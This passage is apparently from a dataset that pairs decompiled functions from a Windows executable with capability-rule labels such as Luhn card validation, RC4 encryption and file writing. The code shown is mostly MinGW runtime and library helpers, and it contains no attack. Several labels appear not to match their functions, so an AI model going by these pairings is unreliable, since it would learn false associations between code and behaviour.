            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140013670(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    \n    iVar5 = 0;\n    puVar4 = arg1 + 0x18;\n    puVar1 = puVar4 + *(arg1 + 0x14);\n    while( true ) {\n        if (puVar1 <= puVar4) {\n            return iVar5;\n        }\n        uVar2 = *puVar4;\n        if (uVar2 != 0) break;\n        puVar4 = puVar4 + 1;\n        iVar5 = iVar5 + 0x20;\n    }\n    if (puVar1 <= puVar4) {\n        return iVar5;\n    }\n    iVar3 = 0;\n    for (; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n        iVar3 = iVar3 + 1;\n    }\n    return iVar5 + iVar3;\n}\n",
        "token_count": 250
    },
    "1400136c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.1400136c0(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    \n    pcVar3 = \"0123456789\";\n    uVar2 = 0x30;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x14001b380) = cVar1 + -0x10;\n        uVar2 = *pcVar3;\n    } while (uVar2 != 0);\n    pcVar3 = \"abcdef\";\n    uVar2 = 0x61;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x14001b380) = cVar1 + -0x11;\n        uVar2 = *pcVar3;\n    } while (uVar2 != 0);\n    pcVar3 = \"ABCDEF\";\n    uVar2 = 0x41;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x14001b380) = cVar1 + -0x18;\n        uVar2 = *pcVar3;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 304
    },
    "140013e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140013e00(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    iVar1 = *(arg1 + 0x14);\n    uVar4 = arg3;\n    iVar3 = 0;\n    do {\n        uVar2 = *(arg1 + 0x18 + iVar3 * 4) * arg2 + uVar4;\n        *(arg1 + 0x18 + iVar3 * 4) = uVar2;\n        iVar3 = iVar3 + 1;\n        uVar4 = uVar2 >> 0x20;\n    } while (iVar3 < iVar1);\n    iVar3 = arg1;\n    if (uVar4 != 0) {\n        if (*(arg1 + 0xc) == iVar1 || *(arg1 + 0xc) < iVar1) {\n            iVar3 = fcn.140013c90(*(arg1 + 8) + 1);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            sub.msvcrt.dll_memcpy(iVar3 + 0x10, arg1 + 0x10, *(arg1 + 0x14) * 4 + 8);\n            fcn.140013d90(arg1);\n        }\n        *(iVar3 + 0x18 + iVar1 * 4) = uVar2 >> 0x20;\n        *(iVar3 + 0x14) = iVar1 + 1;\n    }\n    return iVar3;\n}\n",
        "token_count": 359
    },
    "1400149f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400149f0(char **arg1, char *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    pcVar3 = *arg1;\n    do {\n        cVar1 = *arg2;\n        arg2 = arg2 + 1;\n        pcVar3 = pcVar3 + 1;\n        if (cVar1 == 0) {\n            *arg1 = pcVar3;\n            return 1;\n        }\n        iVar2 = *pcVar3;\n        if (iVar2 - 0x41U < 0x1a) {\n            iVar2 = iVar2 + 0x20;\n        }\n    } while (iVar2 == cVar1);\n    return 0;\n}\n",
        "token_count": 171
    },
    "140014e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140014e10(ushort *arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg4_00;\n    ushort uStack42;\n    \n    uStack42 = 0;\n    if (arg1 == NULL) {\n        arg1 = &uStack42;\n    }\n    sub.msvcrt.dll____mb_cur_max_func();\n    sub.msvcrt.dll____lc_codepage_func();\n    arg4_00 = 0x14001be68;\n    if (arg4 != 0) {\n        arg4_00 = arg4;\n    }\n    iVar1 = fcn.140014c90(arg1, arg2, arg3, arg4_00);\n    return iVar1;\n}\n",
        "token_count": 173
    },
    "140014f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140014f90(ulong arg1, ulong arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    ushort auStack42 [5];\n    \n    auStack42[0] = 0;\n    sub.msvcrt.dll____mb_cur_max_func();\n    sub.msvcrt.dll____lc_codepage_func();\n    if (arg3 == 0) {\n        arg3 = 0x14001be60;\n    }\n    iVar1 = fcn.140014c90(auStack42, arg1, arg2, arg3);\n    return iVar1;\n}\n",
        "token_count": 133
    },
    "140014ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140014ff0(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll___iob_func();\n    return iVar1 + (arg1 & 0xffffffff) * 0x30;\n}\n",
        "token_count": 60
    },
    "14000ae7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.14000ae70(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    while (iVar1 = *arg1,  *arg1 = 0,  iVar1 == 0) {\n        do {\n        } while (*arg1 == 0);\n    }\n    return 0;\n}\n",
        "token_count": 72
    },
    "140001d9": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.140001d90(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    int64_t iVar10;\n    code *pcVar11;\n    uint32_t uVar12;\n    int64_t iVar13;\n    uint64_t uVar14;\n    uint64_t *puVar15;\n    uint *puVar16;\n    int64_t iVar17;\n    int64_t *piVar18;\n    int32_t *piVar19;\n    int32_t iVar20;\n    uint uVar21;\n    char *arg1_00;\n    uint32_t *puVar22;\n    int64_t *arg1_01;\n    ulong *arg3_00;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong auStack392 [5];\n    uint auStack352 [2];\n    uint64_t auStack344 [10];\n    uchar auStack264 [8];\n    ulong uStack256;\n    int64_t iStack240;\n    int64_t iStack232;\n    ulong auStack144 [3];\n    ulong uStack120;\n    int32_t iStack108;\n    ulong *puStack96;\n    \n    puStack96 = &uStackX16;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    iVar13 = fcn.140014ff0(2);\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    uVar14 = fcn.140014ff0(2);\n    arg3_00 = puStack96;\n    sub.msvcrt.dll_vfprintf(uVar14, arg1);\n    sub.msvcrt.dll_abort();\n    iStack240 = *0x14001b0b4;\n    if (*0x14001b0b4 < 1) goto code_r0x000140001f30;\n    iVar20 = 0;\n    puVar15 = *0x14001b0b8 + 0x18;\n    do {\n        if ((*puVar15 <= uVar14) && (arg3_00 = *(puVar15[1] + 8),  uVar14 < *puVar15 + arg3_00)) {\n            return;\n        }\n        iVar20 = iVar20 + 1;\n        puVar15 = puVar15 + 5;\n    } while (iVar20 != *0x14001b0b4);\n    while (iStack232 = fcn.1400027a0(uVar14),  iStack232 != 0) {\n        iStack240 = iStack240 * 0x28;\n        puVar16 = *0x14001b0b8 + iStack240;\n        *(puVar16 + 8) = iStack232;\n        *puVar16 = 0;\n        iVar17 = fcn.1400028d0();\n        iVar17 = *(iStack232 + 0xc) + iVar17;\n        *(*0x14001b0b8 + iStack240 + 0x18) = iVar17;\n        iVar17 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar17, auStack144, 0x30);\n        if (iVar17 == 0) {\n            arg3_00 = *(*0x14001b0b8 + iStack240 + 0x18);\n            fcn.140001d90(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack232 + 8), arg3_00, iVar13);\n            break;\n        }\n        if (((iStack108 - 0x40U & 0xffffffbf) == 0) || ((iStack108 - 4U & 0xfffffffb) == 0)) {\ncode_r0x000140001ecc:\n            *0x14001b0b4 = *0x14001b0b4 + 1;\n            return;\n        }\n        arg3_00 = 0x4;\n        if (iStack108 != 2) {\n            arg3_00 = 0x40;\n        }\n        iVar13 = *0x14001b0b8 + iStack240;\n        *(iVar13 + 8) = auStack144[0];\n        *(iVar13 + 0x10) = uStack120;\n        iVar20 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar20 != 0) goto code_r0x000140001ecc;\n        uVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.140001d90(\"  VirtualProtect failed with code 0x%x\", uVar12, arg3_00, iVar13);\ncode_r0x000140001f30:\n        iStack240 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.140001d90(\"Address %p has no image-section\", uVar14, arg3_00, iVar13);\n    iVar20 = *0x14001b0b0;\n    if (*0x14001b0b0 != 0) {\n        return;\n    }\n    *0x14001b0b0 = 1;\n    auStack344[5] = 0x140001faf;\n    fcn.140002820();\n    auStack344[5] = 0x140001fc6;\n    iVar17 = fcn.140002a60(arg1_00);\n    iVar10 = *0x140018320;\n    puVar9 = *0x1400182d0;\n    *0x14001b0b4 = 0;\n    iVar17 = -iVar17;\n    *0x14001b0b8 = auStack264 + iVar17;\n    if (*0x1400182d0 - *0x1400182e0 < 8) {\n        *0x14001b0b4 = 0;\n        return;\n    }\n    puVar22 = *0x1400182e0;\n    if (*0x1400182d0 - *0x1400182e0 < 0xc) {\ncode_r0x000140002003:\n        if (*puVar22 == 0) {\n            uVar12 = puVar22[1];\ncode_r0x000140002010:\n            if (uVar12 == 0) {\n                uVar14 = puVar22[2];\n                if (puVar22[2] != 1) {\ncode_r0x0001400021e1:\n                    uVar21 = 0x400179a0;\n                    *(auStack344 + iVar17 + 0x28) = 0x1400021ed;\n                    fcn.140001d90(\"  Unknown pseudo relocation protocol version %d.\\n\", uVar14, arg3_00, iVar13);\n                    if (*0x14001b0c0 != NULL) {\n                        uVar6 = *(&uStack256 + iVar17);\n                        *(auStack352 + iVar17) = uVar21;\n                        *(auStack344 + iVar17) = uVar14;\n                        *(auStack344 + iVar17 + 8) = in_XMM2_Qa;\n                        *(auStack344 + iVar17 + 0x10) = in_XMM3_Qa;\n                        *(auStack344 + iVar17 + 0x18) = uVar6;\n                        *(auStack392 + iVar17) = 0x14000222b;\n                        (**0x14001b0c0)(auStack352 + iVar17);\n                    }\n                    return;\n                }\n                puVar22 = puVar22 + 3;\n                if (*0x1400182d0 <= puVar22) {\n                    *0x14001b0b4 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar22 + 2);\n                        uVar14 = uVar2;\n                        piVar18 = *puVar22 + iVar10;\n                        arg1_01 = puVar22[1] + iVar10;\n                        iVar5 = *piVar18;\n                        if (uVar2 != 0x20) break;\n                        iVar4 = *arg1_01;\n                        *(auStack344 + iVar17 + 0x28) = 0x140002194;\n                        fcn.140001e00(arg1_01);\n                        *arg1_01 = iVar5 + (iVar4 - piVar18);\ncode_r0x00014000206c:\n                        puVar22 = puVar22 + 3;\n                        if (puVar9 <= puVar22) goto code_r0x0001400020d8;\n                    }\n                    if (0x20 < uVar2) {\n                        if (uVar2 == 0x40) {\n                            iVar8 = *arg1_01;\n                            *(auStack344 + iVar17 + 0x28) = 0x14000216a;\n                            fcn.140001e00(arg1_01);\n                            *arg1_01 = iVar5 + (iVar8 - piVar18);\n                            goto code_r0x00014000206c;\n                        }\ncode_r0x0001400021d5:\n                        *(auStack344 + iVar17 + 0x28) = 0x1400021e1;\n                        fcn.140001d90(\"  Unknown pseudo relocation bit size %d.\\n\", uVar14, arg3_00, iVar13);\n                        goto code_r0x0001400021e1;\n                    }\n                    if (uVar2 == 8) {\n                        uVar2 = *arg1_01;\n                        arg3_00 = uVar2 | 0xffffffffffffff00;\n                        *(auStack344 + iVar17 + 0x28) = 0x140002069;\n                        fcn.140001e00(arg1_01);\n                        *arg1_01 = iVar5 + (uVar2 - piVar18);\n                        goto code_r0x00014000206c;\n                    }\n                    if (uVar2 != 0x10) goto code_r0x0001400021d5;\n                    uVar3 = *arg1_01;\n                    arg3_00 = uVar3 | 0xffffffffffff0000;\n                    puVar22 = puVar22 + 3;\n                    *(auStack344 + iVar17 + 0x28) = 0x1400020ca;\n                    fcn.140001e00(arg1_01);\n                    *arg1_01 = iVar5 + (uVar3 - piVar18);\n                } while (puVar22 < puVar9);\n                goto code_r0x0001400020d8;\n            }\n        }\n    }\n    else if (**0x1400182e0 == 0) {\n        uVar12 = (*0x1400182e0)[1];\n        if ((uVar12 | (*0x1400182e0)[2]) == 0) {\n            puVar22 = *0x1400182e0 + 3;\n            goto code_r0x000140002003;\n        }\n        goto code_r0x000140002010;\n    }\n    if (*0x1400182d0 <= puVar22) {\n        *0x14001b0b4 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar22 + 1;\n        uVar12 = *puVar22;\n        puVar22 = puVar22 + 2;\n        piVar19 = *puVar1 + iVar10;\n        iVar4 = *piVar19;\n        *(auStack344 + iVar17 + 0x28) = 0x1400021c8;\n        fcn.140001e00(piVar19);\n        *piVar19 = uVar12 + iVar4;\n    } while (puVar22 < puVar9);\ncode_r0x0001400020d8:\n    pcVar11 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x14001b0b4) {\n        iVar13 = 0;\n        do {\n            piVar19 = *0x14001b0b8 + iVar13;\n            iVar4 = *piVar19;\n            if (iVar4 != 0) {\n                uVar6 = *(piVar19 + 4);\n                uVar7 = *(piVar19 + 2);\n                *(auStack344 + iVar17 + 0x28) = 0x140002117;\n                (*pcVar11)(uVar7, uVar6, iVar4, &uStack256 + 4);\n            }\n            iVar20 = iVar20 + 1;\n            iVar13 = iVar13 + 0x28;\n        } while (iVar20 < *0x14001b0b4);\n    }\n    return;\n}\n",
        "token_count": 2898
    }
}